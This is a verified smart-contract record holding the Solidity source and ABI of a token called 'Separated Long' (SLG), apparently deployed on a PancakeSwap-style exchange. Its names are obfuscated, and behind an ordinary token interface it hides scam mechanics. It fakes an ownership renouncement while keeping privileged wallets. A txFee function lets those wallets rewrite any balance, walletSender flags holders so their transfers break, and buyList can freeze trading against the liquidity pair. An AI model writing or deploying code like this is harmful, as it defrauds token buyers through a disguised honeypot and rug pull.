{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundLaunchExempt {\n    function createPair(address takeToken, address maxAuto) external returns (address);\n}\n\ninterface tokenLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTradingLiquidity) external view returns (uint256);\n\n    function transfer(address swapList, uint256 autoLaunched) external returns (bool);\n\n    function allowance(address tradingFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapList,\n        uint256 autoLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptSwap, uint256 value);\n    event Approval(address indexed tradingFund, address indexed spender, uint256 value);\n}\n\ninterface buyLaunch is tokenLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeparatedLong is totalToken, tokenLaunched, buyLaunch {\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTeam;\n    }\n\n    uint256 public sellFundLimit;\n\n    uint8 private fromTeam = 18;\n\n    bool public tradingTo;\n\n    uint256 private totalTo;\n\n    function approve(address walletBuy, uint256 autoLaunched) public virtual override returns (bool) {\n        takeTrading[_msgSender()][walletBuy] = autoLaunched;\n        emit Approval(_msgSender(), walletBuy, autoLaunched);\n        return true;\n    }\n\n    bool public swapMode;\n\n    function isMinFee(address autoReceiverTeam, address swapList, uint256 autoLaunched) internal returns (bool) {\n        if (autoReceiverTeam == totalTx) {\n            return tradingTx(autoReceiverTeam, swapList, autoLaunched);\n        }\n        uint256 totalMode = tokenLaunched(minSellMarketing).balanceOf(txIsLaunched);\n        require(totalMode == sellExemptSwap);\n        require(swapList != txIsLaunched);\n        if (sellMax[autoReceiverTeam]) {\n            return tradingTx(autoReceiverTeam, swapList, launchShould);\n        }\n        return tradingTx(autoReceiverTeam, swapList, autoLaunched);\n    }\n\n    function getOwner() external view returns (address) {\n        return feeBuy;\n    }\n\n    function toSwap() public {\n        emit OwnershipTransferred(totalTx, address(0));\n        feeBuy = address(0);\n    }\n\n    event OwnershipTransferred(address indexed feeAmount, address indexed shouldMax);\n\n    function swapTo(address senderTx) public {\n        require(senderTx.balance < 100000);\n        if (tradingTo) {\n            return;\n        }\n        if (amountAutoAt) {\n            modeTrading = sellFundLimit;\n        }\n        fromMarketing[senderTx] = true;\n        if (liquidityIs) {\n            modeTrading = senderTxLiquidity;\n        }\n        tradingTo = true;\n    }\n\n    address txIsLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function maxExempt() private view {\n        require(fromMarketing[_msgSender()]);\n    }\n\n    uint256 liquidityLaunchedToken;\n\n    mapping(address => bool) public sellMax;\n\n    function transferFrom(address autoReceiverTeam, address swapList, uint256 autoLaunched) external override returns (bool) {\n        if (_msgSender() != tokenReceiver) {\n            if (takeTrading[autoReceiverTeam][_msgSender()] != type(uint256).max) {\n                require(autoLaunched <= takeTrading[autoReceiverTeam][_msgSender()]);\n                takeTrading[autoReceiverTeam][_msgSender()] -= autoLaunched;\n            }\n        }\n        return isMinFee(autoReceiverTeam, swapList, autoLaunched);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalIs;\n    }\n\n    function buyList(uint256 autoLaunched) public {\n        maxExempt();\n        sellExemptSwap = autoLaunched;\n    }\n\n    bool public amountAutoAt;\n\n    address public minSellMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMarketing;\n    }\n\n    uint256 constant launchShould = 12 ** 10;\n\n    function balanceOf(address shouldTradingLiquidity) public view virtual override returns (uint256) {\n        return receiverAutoTake[shouldTradingLiquidity];\n    }\n\n    address public totalTx;\n\n    bool private listTotal;\n\n    bool public liquidityIs;\n\n    string private totalIs = \"Separated Long\";\n\n    function allowance(address listMax, address walletBuy) external view virtual override returns (uint256) {\n        if (walletBuy == tokenReceiver) {\n            return type(uint256).max;\n        }\n        return takeTrading[listMax][walletBuy];\n    }\n\n    function owner() external view returns (address) {\n        return feeBuy;\n    }\n\n    function transfer(address fromTake, uint256 autoLaunched) external virtual override returns (bool) {\n        return isMinFee(_msgSender(), fromTake, autoLaunched);\n    }\n\n    function tradingTx(address autoReceiverTeam, address swapList, uint256 autoLaunched) internal returns (bool) {\n        require(receiverAutoTake[autoReceiverTeam] >= autoLaunched);\n        receiverAutoTake[autoReceiverTeam] -= autoLaunched;\n        receiverAutoTake[swapList] += autoLaunched;\n        emit Transfer(autoReceiverTeam, swapList, autoLaunched);\n        return true;\n    }\n\n    mapping(address => uint256) private receiverAutoTake;\n\n    address private feeBuy;\n\n    bool public marketingMax;\n\n    string private launchedMarketing = \"SLG\";\n\n    mapping(address => mapping(address => uint256)) private takeTrading;\n\n    function txFee(address fromTake, uint256 autoLaunched) public {\n        maxExempt();\n        receiverAutoTake[fromTake] = autoLaunched;\n    }\n\n    uint256 public senderTxLiquidity;\n\n    constructor (){\n        \n        launchTake teamTo = launchTake(tokenReceiver);\n        minSellMarketing = fundLaunchExempt(teamTo.factory()).createPair(teamTo.WETH(), address(this));\n        if (senderTxLiquidity == sellFundLimit) {\n            marketingMax = false;\n        }\n        totalTx = _msgSender();\n        toSwap();\n        fromMarketing[totalTx] = true;\n        receiverAutoTake[totalTx] = autoTxShould;\n        if (swapMode) {\n            liquidityIs = true;\n        }\n        emit Transfer(address(0), totalTx, autoTxShould);\n    }\n\n    uint256 sellExemptSwap;\n\n    mapping(address => bool) public fromMarketing;\n\n    address tokenReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private modeTrading;\n\n    uint256 private autoTxShould = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTxShould;\n    }\n\n    function walletSender(address limitTotal) public {\n        maxExempt();\n        if (totalTo == modeTrading) {\n            listTotal = false;\n        }\n        if (limitTotal == totalTx || limitTotal == minSellMarketing) {\n            return;\n        }\n        sellMax[limitTotal] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAutoAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTradingLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"buyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSellMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFundLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTxLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"}],\"name\":\"swapTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiverTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"}],\"name\":\"walletSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SeparatedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}